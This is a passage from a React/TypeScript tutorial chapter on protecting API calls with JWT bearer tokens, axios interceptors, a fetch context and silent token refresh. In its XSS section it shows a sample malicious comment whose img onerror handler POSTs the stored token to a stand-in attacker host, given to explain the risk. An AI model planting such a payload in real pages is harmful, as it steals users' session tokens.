# Protected API endpoints - Chapter 3
As much as we do our best to protect our data with the changes in the last chapters,
you can never fully protect it only on the frontend because our javascript is accessible (and can be changed) to any visitor.

Therefore, it is crucial that our API endpoints are protected. There are a couple ways to do this.
For example the backend could open a session and set a cookie in your browser when you login and verify this cookie on every call.
Another popular way is to retrieve an access token (JWT) when you log in, that's what's happening in this app.
We can then grab this token in the frontend and add it to the Headers of every call.
The backend can verify this token (by calling the auth server). A big advantage of this, is that it allows
for SSO (single sign on).
This is possible, because we could re-use this cookie for different applications (they can grab it from the localStorage),
and the backend of those applications can all verify the cookie with the same authorization server.
Another cool thing is that CSRF attacks are not an issue (they are related to cookies).
On the other hand we expose ourselves to XSS attacks (cross site scripting), below we will talk about how to handle this.

## Adding the token to our AJAX calls.
You might have noticed that we use the `axios` library to make our calls to the backend. This library makes it very easy
to intercept each call and add a Header to it, which is exactly what we need to do with our access token.
If you run the following code somewhere in your app, an `Authorization` header will be added to all AJAX calls.
```js
axios.interceptors.request.use(
    config => {
        config.headers.authorization = `Bearer ${accessToken}`;
        return config;
    }
)
```
It's a better practice to actually make a different instance of `axios` that adds this `Authorization` header, so 
that we can choose when to send the header and when not. It wouldn't be super safe to send our token to every
public API we are calling with our application.
```js
const authAxios = axios.create({
    baseUrl: apiUrl,
    headers: {
        Authorization: `Bearer ${accessToken}` 
    }
});
```
We can then use the `authAxios` for making calls (for example `authAxios.get('/clients')`)
Now how can we share this `authAxios` instance throughout the application, so that we can use it?
And how can we access the `accessToken` to create this `authAxios` instance in the first place? 
When we talk about sharing something throughout the application, hopefully you're already getting the idea
that we could use the `Context` API for this! And this also allows us to create a wrapper component around the `Provider`, 
so that we can call `useContext(AuthContext)`, to access the accessToken!

Create a file in your `auth` module for our context `src/auth/contexts/FetchContext.tsx`
```tsx
import React, { createContext, useContext, useEffect, useState } from "react";
import axios, { AxiosInstance } from "axios";
import { AuthContext } from "./AuthContext";

const FetchContext = createContext<AxiosInstance>(axios);
const { Provider } = FetchContext;

const FetchProvider = ({ children }: { children: React.ReactNode }) => {
  const authAxios = axios.create({
            baseURL: process.env.REACT_APP_API_URL,
        });
  const { authState } = useContext(AuthContext);

  authAxios.interceptors.request.use(
      (config) => {
          config.headers.Authorization = `Bearer ${authState?.token}`;
          return config;
      },
      (error) => Promise.reject(error)
  );

  return <Provider value={authAxios}>{children}</Provider>;
};

export { FetchContext, FetchProvider };
```
If you haven't seen `process.env.REACT_APP_API_URL` before, this is the way we can provide environment variables with CRA.
These variables are defined in the `.env` file in our root folder.
Read more about it [here](https://create-react-app.dev/docs/adding-custom-environment-variables/)

Now to use this `AxiosInstance` in our app, we wrap the `FetchProvider` Around the `App`, but INSIDE the `AuthProvider`,
so that we can access the `AuthContext`.
```tsx
<AuthProvider>
  <FetchProvider>
    <App />
  </FetchProvider>
</AuthProvider>
```
The last thing you need to do, is to search for all uses of `axios`, and replace it with our new instance.
For example in the `ClientsTable`
```js
const retrieveClients = async () => {
    const result = (await axios.get(`${process.env.REACT_APP_API_URL}/clients`)).data;
    setClients(result);
};
```
becomes
```tsx
const authAxios = useContext(FetchContext);
const retrieveClients = async () => {
    const result = (await authAxios.get("/clients")).data;
    setClients(result);
};
```

## Dealing with XSS
A cross site scripting attack is when an attacker is able to execute JavaScript code on your application.
Consider this scenario: 
I'm an attacker and go to a page on an app where users can leave comments or something.
I write this comment: 
```html
Hello, cool blog. <img src=???
onerror="fetch('hackers-delight.com', 
 { method: 'POST', body: localStorage.getItem('token')})" />
```
Now everyone that reads this comment will send off his/her token to my server.

2 best practices to deal with XSS:
* Use a framework like React (but also Angular, etc.), they will do a lot of work to sanitize all user input.
* create tokens with a short lifetime (for example 10 minutes).

### Refreshtokens
We want to avoid that a user has to re-loging everytime we expire our tokens.
For this we receive a refreshtoken from the auth server when we login. We store this token and exchange it for a new
access token when the old one is about to expire.
You may ask yourself why it is safe for these tokens not to expire, if it is unsafe for normal access tokens.
Well, it is not completely safe, but it is safer because:
* It is a one-time token. Once it is used, it loses it's value for an attacker.
* You only send it once over the wire, in contrast to an access token that will be added to all (or most) calls.

On top of that, you can implement extra security measures. 
For example, the auth server can implement that if a refreshtoken is used twice, it logs out both users that used this token.
The auth server can't know which one of the 2 is an attacker, but this way no harm can be done.

### Using the refreshtokens in our app.
Our sts provides us with a refreshtoken when we log in, you can see this in the sessionStorage.
Again the `oidc-client-js` makes it very easy to implement a silent refresh.
the `UserManager` raises events when the token is about to expire, or when it is expired. 
We can subscribe to these events and do a silent sign in (exchange the refreshtoken for a new access token).
Add the following effect to the `AuthProvider` component to do so.
```tsx
useEffect(() => {
    userManager.events.addAccessTokenExpiring(() => {
        renewToken()
    })
    userManager.events.addAccessTokenExpired(() => {
        renewToken()
    })
}, [])
const renewToken = (): Promise<User | void> =>
    userManager
        .signinSilent()
        .then((user) => setAuthInfo(user))
        .catch((err) => userManager.removeUser());

```

### Refreshing a stale access token on startup.
It is also possible that we have an expired token in the `sessionStorage` when we startup the application. 
We will change the `loadUser` logic in our `AuthProvider`, since this will be called when this component is mounted.
```tsx
const loadUser = () => userManager.getUser().then((user) => {
  if (user && user.expired) {
      // will only work for refreshes.
      // Save the token in localStorage if you want it to work in a completely new tab also.
      renewToken();
    } else if(user) {
      setAuthInfo(user);
    }
});
```
